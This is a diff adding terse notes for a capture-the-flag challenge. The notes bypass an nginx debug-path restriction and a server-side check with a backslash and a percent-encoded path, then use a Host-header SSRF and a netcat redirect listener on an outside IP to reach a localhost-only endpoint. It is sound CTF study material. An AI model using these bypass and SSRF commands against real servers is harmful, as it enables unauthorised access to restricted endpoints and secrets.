@@ -1,0 +1,38 @@
+Flag 1
+	Bypass
+		nginx
+		location /debug {
+			# IP address restriction.
+			# TODO: add allowed IP addresses here
+			allow 127.0.0.1;
+			deny all;
+		}
+
+		angular ts
+		if (process.env.FLAG && req.path.includes('debug')) {
+			return res.status(500).send('debug page is disabled in production env')
+		}
+
+	You can bypass Nginx restriction with '\'
+	node.js normalizes /\debug/answer to /debug/answer.
+	
+	You can bypass Angular with % encoding. Angular automatically decodes this URL.
+
+	curl "http://universe.chal.ctf.westerns.tokyo/\%64ebug/answer"
+
+Flag 2
+	angular ts
+	server.get('/api/true-answer', (req, res) => {
+		if (req.ip.match(/127\.0\.0\.1/)) {
+			res.json(`hello admin, this is true answer: ${process.env.FLAG2}`)
+		} else {
+			res.status(500).send('Access restricted!')
+		}
+	});
+
+	SSRF
+
+	140.113.24.143:
+	echo -e "HTTP/1.1 301 Moved Permanently\r\nLocation:http://127.0.0.1/api/true-answer\r\n\r\n" | sudo nc -l 80
+
+	curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: 140.113.24.143'
